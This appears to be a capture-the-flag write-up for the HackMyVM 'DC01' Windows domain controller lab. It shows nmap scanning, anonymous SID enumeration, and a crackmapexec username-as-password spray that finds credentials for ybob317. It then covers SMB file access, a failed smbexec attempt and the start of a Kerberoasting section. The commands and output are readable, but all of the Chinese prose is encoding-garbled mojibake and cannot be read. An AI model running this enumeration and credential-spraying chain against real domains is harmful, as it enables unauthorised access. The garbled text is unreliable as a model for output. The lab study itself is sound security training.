---
title: HMV-DC01
description: 'Just enjoy my first Windows DC.'
pubDate: 2025-08-19
image: /machine/DC01.png
categories:
  - Documentation
tags:
  - Hackmyvm
  - Windows Machine
---

# ä¿¡æ¯æ”¶é›†
```plain
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# arp-scan -l | grep "08:00:27" | awk '{print $1}'
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
10.0.91.3       
```

```plain
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nmap -sC -sT -sV -p- -O 10.0.91.3    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-19 02:59 EDT

â— -sC
ä½¿ç”¨ Nmap è‡ªå¸¦çš„ é»˜è®¤è„šæœ¬é›† (equivalent to --script=default) ï¼Œä¼šå°è¯•å¸¸è§çš„ä¿¡æ¯æ”¶é›†ï¼ˆå¦‚ banner æŠ“å–ã€æ¼æ´æ¢æµ‹ï¼‰ã€‚
â— -sT
ä½¿ç”¨ TCP connect() æ‰«æã€‚è¿™æ˜¯æœ€åŸºç¡€çš„ TCP æ‰«ææ–¹å¼ï¼Œç›´æ¥è°ƒç”¨ç³»ç»Ÿçš„ connect ç³»ç»Ÿè°ƒç”¨å»å»ºç«‹ä¸‰æ¬¡æ¡æ‰‹ï¼Œé€Ÿåº¦è¾ƒæ…¢ï¼Œä¹Ÿæ›´å®¹æ˜“è¢«å‘ç°ã€‚
â— -sV
ç‰ˆæœ¬æ¢æµ‹ã€‚åœ¨å‘ç°å¼€æ”¾ç«¯å£åï¼Œè¿›ä¸€æ­¥æ¢æµ‹æœåŠ¡çš„ç‰ˆæœ¬å·ã€è½¯ä»¶åã€‚
â— -p-
æ‰«æ æ‰€æœ‰ 65535 ä¸ª TCP ç«¯å£ï¼ˆä» 1 åˆ° 65535ï¼‰ã€‚
â— -O
å¯ç”¨ æ“ä½œç³»ç»Ÿæ¢æµ‹ï¼ˆåŸºäº TCP/IP å †æ ˆç‰¹å¾æŒ‡çº¹åŒ¹é…ï¼‰ã€‚
```

```plain
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nmap -sC -sT -sV -p- -O 10.0.91.3    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-19 02:59 EDT
Nmap scan report for 10.0.91.3
Host is up (0.00039s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-19 22:00:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49705/tcp open  msrpc         Microsoft Windows RPC
49790/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:B9:D1:18 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 14h59m56s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:b9:d1:18 (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2025-08-19T22:01:43
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.41 seconds

```

å‘ç°`Domain: SOUPEDECODE.LOCAL0`ï¼ŒåŸŸåè§£æä¸€èˆ¬éƒ½æ˜¯å°å†™ï¼Œæ·»åŠ è¿›dns

# DNSå†™å…¥
```plain
sudo nano /etc/hosts
10.0.91.3 soupedecode.local
```



# æ¸—é€æ€è·¯
## 4ï¸âƒ£ æ¸—é€æµ‹è¯•é‡ç‚¹
1. **åŸŸæšä¸¾**
    - LDAP 389/3268: å¯å°è¯• `ldapsearch` æšä¸¾ç”¨æˆ·å’Œç»„ã€‚
    - RPC 135+åŠ¨æ€ç«¯å£: å¯ç”¨ `rpcclient` æˆ– `lookupsid.py` æšä¸¾ SID / ç”¨æˆ·ã€‚
2. **SMB ç›¸å…³**
    - 445/139: æšä¸¾å…±äº«ç›®å½•ï¼ˆ`smbclient -L`ï¼‰ã€NTLM è®¤è¯æµ‹è¯•ã€‚
    - SMB ç­¾åå¼ºåˆ¶å¼€å¯ â†’ é˜»æ­¢ä¸­é—´äººæ”»å‡»ï¼Œä½†ä¸ä¼šé˜»æ­¢åˆæ³•æšä¸¾ã€‚
3. **Kerberos/WinRM**
    - 88/464: å¯åš Kerberos æšä¸¾æˆ–å¯†ç å–·å°„ï¼ˆAS-REP Roastingã€Kerberoastingï¼‰ã€‚
    - 5985: WinRM æœåŠ¡ï¼Œåˆæ³•å‡­æ®å¯è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚
4. **DNS**
    - 53/tcp: å¯åšåŸŸåè§£æã€å†…éƒ¨åŸŸä¿¡æ¯æšä¸¾ã€åŸŸåçˆ†ç ´ã€‚

# åŒ¿åæšä¸¾
## å‰ç½®çŸ¥è¯†
### ğŸ”¹1. LDAP åŒ¿åæšä¸¾
åŒ¿åç»‘å®šï¼ˆAnonymous Bindï¼‰å…è®¸æœªè®¤è¯çš„ç”¨æˆ·è¿æ¥ LDAPã€‚

åˆ¤æ–­æ–¹æ³•ï¼š

```plain
ldapsearch -x -H ldap://<IP> -D '' -w '' -b '' -s base "(objectclass=*)"
```

+ **æˆåŠŸè¿”å›åŸŸåä¿¡æ¯ã€ç›®å½•ç»“æ„** â†’ æ”¯æŒåŒ¿åç»‘å®šï¼Œå¯ä»¥æšä¸¾ç”¨æˆ·/ç»„ã€‚
+ **è¿”å› **`**Invalid credentials**`** æˆ– **`**Insufficient access**` â†’ åŒ¿åæšä¸¾è¢«ç¦ç”¨ã€‚

---

### ğŸ”¹2. SMB åŒ¿åæšä¸¾
Windows çš„ SMB æœåŠ¡å…è®¸â€œç©ºä¼šè¯â€ï¼ˆNull Sessionï¼‰ã€‚

åˆ¤æ–­æ–¹æ³•ï¼š

```plain
smbclient -L //<IP> -N
```

+ **èƒ½åˆ—å‡ºå…±äº«** â†’ å…è®¸åŒ¿åä¼šè¯ã€‚
+ **æŠ¥é”™ **`**NT_STATUS_ACCESS_DENIED**`** æˆ– **`**Logon failure**` â†’ ç¦æ­¢åŒ¿åã€‚

è¿˜å¯ä»¥ç”¨ï¼š

```plain
rpcclient -U "" <IP>
```

å¦‚æœç›´æ¥èƒ½è¿›å…¥ RPC å‘½ä»¤è¡Œï¼ˆå¦‚è¾“å…¥ `enumdomusers` æœ‰è¾“å‡ºï¼‰ï¼Œè¯´æ˜åŒ¿åå¯ç”¨ã€‚

---

### ğŸ”¹3. RPC æšä¸¾
RPC æœåŠ¡ï¼ˆ135ç«¯å£ + åŠ¨æ€ç«¯å£ï¼‰ä¹Ÿå¯èƒ½æ”¯æŒåŒ¿åã€‚

åˆ¤æ–­æ–¹æ³•ï¼š

```plain
rpcclient -U "" <IP>
```

+ **èƒ½ç›´æ¥è¿›å…¥** â†’ åŒ¿åæšä¸¾å¼€å¯ã€‚
+ **è¦æ±‚è¾“å…¥å¯†ç ** â†’ åŒ¿åç¦ç”¨ã€‚

---

### ğŸ”¹4. lookupsid.py
`lookupsid.py` å¯ä»¥ç”¨ **ç©ºç”¨æˆ·å/ç©ºå¯†ç ** å°è¯•åŒ¿å SID æšä¸¾ï¼š

```plain
lookupsid.py <DOMAIN>/""@<IP>
```

+ **èƒ½è¿”å› RID å¯¹åº”çš„ç”¨æˆ·å/ç»„å** â†’ åŒ¿åå¯è¡Œã€‚
+ **è¿”å› **`**STATUS_ACCESS_DENIED**` â†’ åŒ¿åç¦ç”¨ã€‚



## æšä¸¾å‘½ä»¤
### 1ï¸âƒ£ LDAP æšä¸¾ï¼ˆ389 / 3268ï¼‰
##### æšä¸¾åŸŸç”¨æˆ·
```plain
ldapsearch -x -H ldap://10.0.91.3:389 -D "" -w "" -b "DC=SOUPEDECODE,DC=LOCAL" "(objectClass=user)" sAMAccountName
```

#### æšä¸¾åŸŸç»„
```plain
ldapsearch -x -H ldap://10.0.91.3:389 -D "" -w "" -b "DC=SOUPEDECODE,DC=LOCAL" "(objectClass=group)" cn
```

---

### 2ï¸âƒ£ RPC æšä¸¾ï¼ˆ135 + åŠ¨æ€ç«¯å£ï¼‰
#### ä½¿ç”¨ rpcclient åŒ¿åè¿æ¥
```plain
rpcclient -U "" -N 10.0.91.3
```

è¿›å…¥ RPC shell åï¼š

```plain
enumdomusers       # æšä¸¾åŸŸç”¨æˆ·
enumdomgroups      # æšä¸¾åŸŸç»„
queryuser <RID>    # æŸ¥çœ‹æŒ‡å®šç”¨æˆ·ä¿¡æ¯
```

#### ä½¿ç”¨ lookupsid.pyï¼ˆImpacketï¼‰
```plain
lookupsid.py 'SOUPEDECODE.LOCAL/anonymous:@10.0.91.3' > users.txt
```

+ ä¼šæŠŠåŸŸå†… SID â†’ ç”¨æˆ·/ç»„æ˜ å°„è¾“å‡ºåˆ° `users.txt`

---

### 3ï¸âƒ£ SMB æšä¸¾ï¼ˆ445 / 139ï¼‰
#### æšä¸¾å…±äº«ç›®å½•ï¼ˆåŒ¿åï¼‰
```plain
smbclient -L //10.0.91.3 -N
```

#### è®¿é—®å…±äº«ï¼ˆä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç ï¼‰
```plain
smbclient //10.0.91.3/C$ -U <username>%<password>
```

##  impacket-lookupsid  
`lookupsid.py`ï¼ˆåœ¨ Kali ä¸Šå« `impacket-lookupsid`ï¼‰æ˜¯ **Impacket å·¥å…·é›†é‡Œä¸“é—¨ç”¨äºæšä¸¾ Windows/Active Directory åŸŸ SIDï¼ˆå®‰å…¨æ ‡è¯†ç¬¦ï¼‰çš„å·¥å…·**ã€‚

---

### 1ï¸âƒ£ å®ƒçš„ä¸»è¦ç”¨é€”
1. **æšä¸¾åŸŸ SID**
    - è·å–åŸŸçš„ **å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆDomain SIDï¼‰**ï¼Œä¾‹å¦‚ï¼š

```plain
S-1-5-21-2986980474-46765180-2505414164
```

    - è¿™æ˜¯åç»­ç”¨æˆ·å“ˆå¸Œè·å–ã€æƒé™æšä¸¾çš„é‡è¦ä¿¡æ¯ã€‚
2. **æšä¸¾åŸŸç”¨æˆ·å’Œç»„**
    - é€šè¿‡æš´åŠ›å°è¯• **RID**ï¼ˆRelative Identifierï¼Œç›¸å¯¹æ ‡è¯†ç¬¦ï¼‰èŒƒå›´ï¼Œæ‰¾å‡ºæ‰€æœ‰å·²æ³¨å†Œçš„ç”¨æˆ·ã€ç»„å’Œè®¡ç®—æœºè´¦æˆ·ã€‚
    - è¾“å‡ºç±»ä¼¼ï¼š

```plain
500: SOUPEDECODE\Administrator (SidTypeUser)
512: SOUPEDECODE\Domain Admins (SidTypeGroup)
2163: SOUPEDECODE\backup_svc (SidTypeUser)
```

    - å¯ä»¥å¿«é€Ÿå¾—åˆ°æ•´ä¸ªåŸŸçš„è´¦æˆ·åˆ—è¡¨ï¼ŒåŒ…æ‹¬æœåŠ¡è´¦å·å’Œè®¡ç®—æœºè´¦å·ã€‚
3. **åŒ¿åæšä¸¾æ”¯æŒ**
    - å³ä½¿æ²¡æœ‰åˆæ³•åŸŸç”¨æˆ·è®¤è¯ï¼Œæœ‰äº› Windows åŸŸå…è®¸ **RPC æ¥å£çš„åŒ¿åæŸ¥è¯¢**ï¼Œä»ç„¶å¯ä»¥æšä¸¾éƒ¨åˆ†æˆ–å…¨éƒ¨è´¦æˆ·ã€‚
    - å¯¹æ¸—é€æµ‹è¯•å’Œä¿¡æ¯æ”¶é›†å¾ˆæœ‰ç”¨ã€‚

---

### 2ï¸âƒ£ å·¥ä½œåŸç†
+ ä½¿ç”¨ **LSARPC (Local Security Authority Remote Procedure Call)** åè®®
+ è¿æ¥åˆ°ç›®æ ‡åŸŸæ§çš„ **RPC æ¥å£**ï¼Œé€šå¸¸æ˜¯ `ncacn_np:<target>[\pipe\lsarpc]`
+ é€šè¿‡å‘é€è¯·æ±‚å°è¯•ä¸åŒçš„ **RID**ï¼Œè·å– SID â†’ åç§°æ˜ å°„

### <font style="color:rgb(38, 38, 38);">3ï¸âƒ£</font><font style="color:rgb(38, 38, 38);"> </font> å‰ææ¡ä»¶
1. **ç›®æ ‡æ˜¯ Windows åŸŸæ§æˆ–åŠ å…¥åŸŸçš„æœåŠ¡å™¨**
    - åªæœ‰ Active Directory æ‰æœ‰åŸŸ SIDã€åŸŸç”¨æˆ·å’Œç»„çš„æ¦‚å¿µã€‚
2. **èƒ½è®¿é—®åŸŸæ§çš„ RPC æ¥å£**
    - å¸¸è§ç«¯å£ï¼š`135/TCP`ï¼ˆRPC Endpoint Mapperï¼‰ + åŠ¨æ€ RPC ç«¯å£ï¼ˆä¸€èˆ¬ 49152â€“65535ï¼‰
    - å·¥å…·é»˜è®¤ä½¿ç”¨ LSARPCï¼ˆ`ncacn_np:<IP>[\pipe\lsarpc]`ï¼‰è®¿é—® RPCã€‚
3. **åŒ¿åæˆ–ä½æƒé™å¯ç”¨**
    - ä¸€äº›åŸŸå…è®¸åŒ¿å RPC æŸ¥è¯¢ï¼Œè¿™æ—¶æ— éœ€åŸŸè´¦æˆ·å³å¯ä½¿ç”¨ `lookupsid`ã€‚
    - å¦‚æœåŒ¿åè®¿é—®è¢«ç¦ç”¨ï¼Œéœ€è¦ä½¿ç”¨åˆæ³•è´¦æˆ·æˆ–å‡­æ®ã€‚
4. **éœ€è¦æ”¶é›†åˆå§‹ä¿¡æ¯**
    - ä½ æƒ³æšä¸¾ï¼š
        * åŸŸ SID
        * åŸŸç”¨æˆ·ï¼ˆæ™®é€šè´¦æˆ·ã€æœåŠ¡è´¦æˆ·ã€è®¡ç®—æœºè´¦æˆ·ï¼‰
        * åŸŸç»„ï¼ˆDomain Admins, Domain Users ç­‰ï¼‰

## å·¥å…·åˆ©ç”¨
```plain
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# impacket-lookupsid SOUPEDECODE.LOCAL/anonymous@10.0.91.3

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.0.91.3
[*] StringBinding ncacn_np:10.0.91.3[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SOUPEDECODE\Administrator (SidTypeUser)
501: SOUPEDECODE\Guest (SidTypeUser)
502: SOUPEDECODE\krbtgt (SidTypeUser)
512: SOUPEDECODE\Domain Admins (SidTypeGroup)
513: SOUPEDECODE\Domain Users (SidTypeGroup)
514: SOUPEDECODE\Domain Guests (SidTypeGroup)
515: SOUPEDECODE\Domain Computers (SidTypeGroup)
516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
518: SOUPEDECODE\Schema Admins (SidTypeGroup)
519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
..........
2154: SOUPEDECODE\PC-82$ (SidTypeUser)
2155: SOUPEDECODE\PC-83$ (SidTypeUser)
2156: SOUPEDECODE\PC-84$ (SidTypeUser)
2157: SOUPEDECODE\PC-85$ (SidTypeUser)
2158: SOUPEDECODE\PC-86$ (SidTypeUser)
2159: SOUPEDECODE\PC-87$ (SidTypeUser)
2160: SOUPEDECODE\PC-88$ (SidTypeUser)
2161: SOUPEDECODE\PC-89$ (SidTypeUser)
2162: SOUPEDECODE\PC-90$ (SidTypeUser)
2163: SOUPEDECODE\firewall_svc (SidTypeUser)
2164: SOUPEDECODE\backup_svc (SidTypeUser)
2165: SOUPEDECODE\web_svc (SidTypeUser)
2166: SOUPEDECODE\monitoring_svc (SidTypeUser)
```

# å·¥å…·ä»‹ç»
## 1ï¸âƒ£ CrackMapExec (CME)
**ç”¨é€”ï¼š** ä»¥ **æ¸—é€æµ‹è¯•è‡ªåŠ¨åŒ–ä¸ºä¸»**ï¼Œä¾§é‡â€œè´¦æˆ·å‡­æ®éªŒè¯ + æ¨ªå‘ç§»åŠ¨ + ä¿¡æ¯æ”¶é›†â€ã€‚

**ç‰¹ç‚¹ï¼š**

+ æ”¯æŒ SMB/LDAP/WinRM/MSSQL ç­‰å¤šåè®®ï¼Œä¸ä»…ä»…æ˜¯ SMB
+ èƒ½ç”¨å·²çŸ¥ç”¨æˆ·å/å¯†ç æˆ– NTLM hash éªŒè¯ç™»å½•
+ å¯æšä¸¾åŸŸä¿¡æ¯ã€ç”¨æˆ·ã€ç»„ã€å…±äº«ã€ä¼šè¯
+ å¯æ‰§è¡Œè¿œç¨‹å‘½ä»¤ï¼ˆPSEXECã€WMICã€WMIï¼‰
+ é€‚åˆ **çº¢é˜Ÿæ¸—é€æµç¨‹ä¸­è‡ªåŠ¨åŒ–æ”»å‡»å’Œå†…ç½‘æ¨ªå‘ç§»åŠ¨**

**å…¸å‹å‘½ä»¤ï¼š**

```plain
# æµ‹è¯• SMB ç™»å½•
cme smb 10.0.91.3 -u Administrator -p 'Passw0rd!'

# æšä¸¾ SMB å…±äº«
cme smb 10.0.91.3 -u user -p pass --shares

# æšä¸¾åŸŸç”¨æˆ·
cme ldap 10.0.91.3 -u 'user' -p 'pass' --users
```

---

## 2ï¸âƒ£ smbmap
**ç”¨é€”ï¼š** ä¸“æ³¨äº **å…±äº«ç›®å½•æƒé™æ‰«æå’Œæ–‡ä»¶æšä¸¾**ï¼Œæ›´åƒ SMB çš„â€œæ‰«æå™¨+æ–‡ä»¶è®¿é—®å·¥å…·â€ã€‚

**ç‰¹ç‚¹ï¼š**

+ æ£€æµ‹å“ªäº›å…±äº«å¯è®¿é—®ï¼ˆè¯»/å†™/åˆ—å‡ºï¼‰
+ å¯ä»¥é€’å½’åˆ—å‡ºå…±äº«ç›®å½•ä¸‹æ–‡ä»¶
+ å¯ä¸‹è½½æˆ–ä¸Šä¼ æ–‡ä»¶ï¼ˆå¦‚æœæƒé™å…è®¸ï¼‰
+ ä¸å…³æ³¨åŸŸä¿¡æ¯æˆ–æ¨ªå‘ç§»åŠ¨ï¼Œåªå…³æ³¨ SMB æ–‡ä»¶ç³»ç»Ÿ

**å…¸å‹å‘½ä»¤ï¼š**

```plain
# åˆ—å‡ºå…±äº«å’Œæƒé™
smbmap -H 10.0.91.3 -u user -p pass

# ä¸‹è½½å…±äº«ç›®å½•ä¸‹æ–‡ä»¶
smbmap -H 10.0.91.3 -u user -p pass -R /shared/folder

# ä¸Šä¼ æ–‡ä»¶
smbmap -H 10.0.91.3 -u user -p pass -U /local/file.txt -T /remote/path
```

---

## 3ï¸âƒ£ åŒºåˆ«æ€»ç»“
| å·¥å…· | ä¸»è¦ç”¨é€” | å¼ºé¡¹ | å…¸å‹é˜¶æ®µ |
| --- | --- | --- | --- |
| **CME** | å†…ç½‘æ¸—é€è‡ªåŠ¨åŒ–ã€å‡­æ®éªŒè¯ã€æ¨ªå‘ç§»åŠ¨ | æšä¸¾åŸŸã€ç”¨æˆ·ã€ç»„ã€å…±äº«ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œ | å†…ç½‘æ¸—é€ã€çº¢é˜Ÿæ“ä½œ |
| **smbmap** | SMB æ–‡ä»¶ç³»ç»Ÿæšä¸¾ | æ‰«æå…±äº«ç›®å½•æƒé™ã€ä¸‹è½½/ä¸Šä¼ æ–‡ä»¶ | SMB æƒé™æµ‹è¯•ã€æ–‡ä»¶æ¸—é€ |




# çˆ†ç ´ç™»å½•
## æå–æŒ‡ä»¤
```c
500: SOUPEDECODE\Administrator (SidTypeUser)
impacket-lookupsid SOUPEDECODE.LOCAL/anonymous@10.0.91.3 \
| grep "(SidTypeUser)" \
| awk -F'\\' '{print $2}' \
| grep -v '\$' \
| sed 's/ (SidTypeUser)//'
```

###  Awk ä¸ºä»€ä¹ˆè¦ä¸¤ä¸ª `\`
> åœ¨ awk é‡Œï¼Œ`**-F**` ç”¨æ¥æŒ‡å®šåˆ†éš”ç¬¦ã€‚
>
> æˆ‘ä»¬æƒ³ç”¨ åæ–œæ  `**\**` ä½œä¸ºåˆ†éš”ç¬¦ï¼Œä½† `**\**` åœ¨å¾ˆå¤šåœ°æ–¹æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ¯”å¦‚ï¼š`**\n**` è¡¨ç¤ºæ¢è¡Œã€‚
>
> æ‰€ä»¥ä¸ºäº†è®© awk è¯†åˆ«çœŸæ­£çš„åæ–œæ ï¼Œéœ€è¦å†™æˆ `**\\**`ã€‚
>
> ç¬¬ä¸€ä¸ª `**\**` æ˜¯å‘Šè¯‰ awkâ€œåé¢æ˜¯ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦â€
>
> ç¬¬äºŒä¸ª `**\**` è¡¨ç¤ºå­—é¢é‡çš„åæ–œæ 
>
> ä¸¾ä¸ªä¾‹å­ï¼š
>
> SOUPEDECODE\Administrator
>
> å¦‚æœä½ ç”¨ `**-F'\\'**` åˆ†éš”ï¼Œawk ä¼šæŠŠå®ƒæ‹†æˆä¸¤åˆ—ï¼š
>

| åˆ—1 | åˆ—2 |
| --- | --- |
| SOUPEDECODE | Administrator |


> `**{print $1}**` â†’ è¾“å‡º SOUPEDECODEï¼ˆåŸŸåï¼‰
>
> `**{print $2}**` â†’ è¾“å‡º Administratorï¼ˆç”¨æˆ·åï¼‰
>

### Sed åˆ†æ
sed 's/ (SidTypeUser)//'

åˆ†è§£å¼€æ¥ï¼š



sedï¼šæµç¼–è¾‘å™¨ï¼Œç”¨æ¥å¤„ç†æ–‡æœ¬ï¼Œå¯ä»¥å¯¹æ¯ä¸€è¡Œè¿›è¡Œæ›¿æ¢ã€åˆ é™¤ç­‰æ“ä½œã€‚

s/.../.../ï¼šè¿™æ˜¯ sed çš„æ›¿æ¢å‘½ä»¤ï¼Œæ ¼å¼æ˜¯ s/è¦æ›¿æ¢çš„å†…å®¹/æ›¿æ¢æˆä»€ä¹ˆ/

å·¦è¾¹æ˜¯ä½ è¦åŒ¹é…çš„æ–‡æœ¬

å³è¾¹æ˜¯ä½ æƒ³æ›¿æ¢æˆçš„æ–‡æœ¬

(SidTypeUser)ï¼šè¿™æ˜¯è¦åŒ¹é…çš„æ–‡æœ¬ï¼Œä¹Ÿå°±æ˜¯æ¯è¡Œæœ«å°¾çš„ (SidTypeUser)

æ³¨æ„å‰é¢æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œè¦ä¸€èµ·åŒ¹é…

//ï¼šæ›¿æ¢æˆç©ºï¼Œä¹Ÿå°±æ˜¯æŠŠåŒ¹é…åˆ°çš„å†…å®¹åˆ é™¤



```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# impacket-lookupsid SOUPEDECODE.LOCAL/anonymous@10.0.91.3 \
| grep "(SidTypeUser)" \
| awk -F'\\' '{print $2}' \
| grep -v '\$' \
| sed 's/ (SidTypeUser)//'\
pipe pipe pipe pipe> >user.txt

å¾—åˆ°user.txt
```

## SMB çˆ†ç ´
ä½¿ç”¨`Crackmapexec`è¿›è¡Œ`smb`çˆ†ç ´

```c
crackmapexec smb 10.0.91.3 -u user.txt -p user.txt --continue-on-success --no-bruteforce | grep +

    --continue-on-success
æ‰¾åˆ°ä¸€ä¸ªæœ‰æ•ˆå‡­æ®åï¼Œä¸ä¼šåœæ­¢ï¼Œè€Œæ˜¯ç»§ç»­æµ‹è¯•å…¶ä»–ç”¨æˆ·/å¯†ç ç»„åˆã€‚

--no-bruteforce
ç”¨æˆ·å’Œå¯†ç æ˜¯â€œä¸€ä¸€å¯¹åº”â€çš„ï¼Œå³ç¬¬1è¡Œç”¨æˆ·åªæ­é…ç¬¬1è¡Œå¯†ç ï¼Œç¬¬2è¡Œç”¨æˆ·åªæ­é…ç¬¬2è¡Œå¯†ç ã€‚ä¸ä¼šè¿›è¡Œå…¨æ’åˆ—çˆ†ç ´ã€‚

ğŸ‘‰ æ‰€ä»¥è¿™é‡Œæ›´åƒæ˜¯â€œå‡­æ®å¯¹åˆ—è¡¨â€æµ‹è¯•ï¼Œè€Œä¸æ˜¯å­—å…¸çˆ†ç ´ã€‚

| grep +
CME çš„è¾“å‡ºä¸­ï¼ŒæˆåŠŸç™»é™†çš„è¡Œå‰é¢é€šå¸¸ä¼šæœ‰ + ç¬¦å·ã€‚é€šè¿‡ grep è¿‡æ»¤ï¼Œåªæ˜¾ç¤ºæˆåŠŸçš„ç»“æœã€‚


```

> â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
>
> â””â”€# crackmapexec smb 10.0.91.3 -u user.txt -p user.txt --continue-on-success --no-bruteforce | grep +
>
> 
>
> SMB                      10.0.91.3       445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
>

## SMBç™»å½•
smbclient //<font style="color:rgb(38, 38, 38);">10.0.91.3</font>/IPC$ -U ybob317     

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# smbclient //10.0.91.3/IPC$ -U ybob317
Password for [WORKGROUP\ybob317]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
```

ä½¿ç”¨smbclient 

```c
smbclient //10.0.91.3/users -U SOUPEDECODE.LOCAL/ybob317%ybob317
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu Jul  4 18:48:22 2024
  ..                                DHS        0  Mon Jun 17 13:42:50 2024
  admin                               D        0  Thu Jul  4 18:49:01 2024
  Administrator                       D        0  Sat Jun 15 15:56:40 2024
  All Users                       DHSrn        0  Sat May  8 04:26:16 2021
  Default                           DHR        0  Sat Jun 15 22:51:08 2024
  Default User                    DHSrn        0  Sat May  8 04:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 04:14:03 2021
  Public                             DR        0  Sat Jun 15 13:54:32 2024
  ybob317                             D        0  Mon Jun 17 13:24:32 2024
```

```c
smb: \ybob317\Desktop\> get user.txt 
getting file \ybob317\Desktop\user.txt of size 32 as user.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
```

```c
// cat user.txt
6bab1f09a7403980bfeb4c2b412be47b 
```

## SMBexec                                                                                         
```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# impacket-smbexec SOUPEDECODE\ybob317:ybob317@10.0.91.3 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.


å‡­æ®æ­£ç¡®ï¼ˆå¦åˆ™ä¼šæ˜¯ STATUS_LOGON_FAILUREï¼‰ï¼Œè¯´æ˜ ybob317 ç”¨æˆ· + å¯†ç èƒ½è®¤è¯ã€‚
ä½†æ˜¯ æƒé™ä¸è¶³ï¼Œä¸èƒ½ä½¿ç”¨ smbexec è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚
```

# Kerberoasting
ä¹‹å‰æ‰«æç«¯å£ï¼Œçœ‹åˆ°ä¸€ä¸ªç¥¨æ®è®¤è¯çš„æœåŠ¡ç«¯å£ï¼Œå°è¯•æ‰¾ç›¸å…³å·¥å…·æ‰«ä¸€ä¸‹ï¼

```c
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-19 22:00:51Z)
```

  
 é¶æœºå¼€ç€88ç«¯å£ï¼Œå°±æ˜¯`kerberos`çš„éªŒè¯æœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è·å–è¯¥ç”¨æˆ·çš„`SPN`ç„¶åè¿›è¡Œ`kerberoasting`

`kerberoasting`æœ¬è´¨ä¸Šå°±æ˜¯ç ´è§£TGSç¥¨æ®ï¼ŒTGSç¥¨æ®ä½¿ç”¨æœåŠ¡HASHæ¥åŠ å¯†çš„

é¦–å…ˆç¬¬ä¸€æ­¥å°±æ˜¯è·å–ç”¨æˆ·`SPN` ï¼Œä½¿ç”¨`Impacket-GetUserSpn`

## å‰ç½®çŸ¥è¯†
